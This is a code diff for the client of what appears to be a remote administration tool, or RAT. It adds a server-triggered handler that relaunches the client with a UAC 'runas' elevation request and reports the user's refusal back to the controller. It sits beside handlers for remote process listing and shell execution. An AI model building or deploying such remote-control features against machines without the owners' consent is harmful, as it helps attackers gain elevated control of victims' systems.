@@ -11,6 +11,7 @@ using xClient.Core.Helper;
 using xClient.Core.Networking;
 using xClient.Core.Utilities;
 using xClient.Enums;
+using xClient.Core.Helper;
 
 namespace xClient.Core.Commands
 {
@@ -437,6 +438,34 @@ namespace xClient.Core.Commands
                 HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
             }
         }
+
+        public static void HandleAskElevate(Packets.ServerPackets.DoAskElevate command, Client client)
+        {
+            if (!(WindowsAccountHelper.GetAccountType() == "Admin"))
+            {
+                ProcessStartInfo proc = new ProcessStartInfo();
+                proc.UseShellExecute = true;
+                proc.WorkingDirectory = Environment.CurrentDirectory;
+                proc.FileName = Application.ExecutablePath;
+                proc.Verb = "runas";
+
+                try
+                {
+                    Process.Start(proc);
+                }
+                catch
+                {
+                    new Packets.ClientPackets.SetStatus("User refused the elevation request").Execute(client);
+                    return;
+                }
+                Application.Exit();
+            }
+            else
+            {
+                new Packets.ClientPackets.SetStatus("Process already running as Admin").Execute(client);
+            }
+        }
+        
 
         public static void HandleDoShellExecute(Packets.ServerPackets.DoShellExecute command, Client client)
         {
